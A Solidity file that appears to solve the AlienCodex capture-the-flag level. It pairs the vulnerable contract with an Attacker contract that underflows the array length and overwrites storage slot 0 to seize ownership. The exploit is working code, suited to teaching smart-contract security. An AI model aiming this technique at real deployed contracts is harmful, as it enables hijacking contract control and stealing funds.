// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/ownership/Ownable.sol";

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

contract Attacker {
    address public owner;
    AlienCodex public victim;

    constructor(address _victim) public {
        owner = msg.sender;
        victim = AlienCodex(_victim);
    }

    function attack() public {
        victim.make_contact();
        victim.retract();
        victim.revise(getFirstStorageAddress(), getOwnerAddress());
    }

    function getOwnerAddress() private view returns(bytes32){
        return bytes32(uint(uint160(owner)));
    }

    function getFirstStorageAddress() private pure returns(uint){
        return uint((2**256) - 1) - uint256(keccak256(abi.encode(1))) + 1;
    }
}